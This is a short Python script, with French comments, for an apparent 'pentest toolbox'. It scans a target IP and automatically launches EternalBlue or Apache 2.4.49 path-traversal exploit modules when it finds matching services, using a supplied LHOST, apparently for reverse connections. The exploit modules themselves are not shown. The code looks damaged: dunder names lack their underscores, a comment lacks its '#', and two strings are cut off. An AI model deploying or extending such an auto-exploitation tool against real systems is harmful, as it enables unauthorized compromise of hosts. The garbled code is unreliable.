import sys, os
import re

Ajouter les chemins aux modules
sys.path.append(os.path.abspath(os.path.dirname(file)))

from utils.scanner import scan_target
import exploits.eternalblue as eternalblue
import exploits.apache_path_traversal as apache

def detect_and_dispatch(scan_output, target, lhost):
    print("\n[+] Analyse des résultats du scan...\n")

    # ✅ Détection plus fiable d'EternalBlue (SMB + Windows)
    if re.search(r"445/tcp\s+open\s+.*Windows", scan_output, re.IGNORECASE):
        print("[✓] SMB Windows détecté sur port 445. Lancement de EternalBlu>
        eternalblue.run(target, lhost)

    elif "80/tcp open" in scan_output and "Apache 2.4.49" in scan_output:
        print("[✓] Apache vulnérable détecté. Lancement de l'exploit Path Tr>
        apache.run(target)

    else:
        print("[!] Aucun service vulnérable reconnu.")
def main():
    print("========== 🛠 PENTEST TOOLBOX ==========\n")
    target = input("🖥  IP de la cible : ").strip()
    lhost = input("🌐  Ton IP locale (LHOST) : ").strip()

    print(f"\n[~] Scan en cours sur {target}...\n")
    scan_output = scan_target(target)
    print(scan_output)

    detect_and_dispatch(scan_output, target, lhost)

if name == "main":
    main()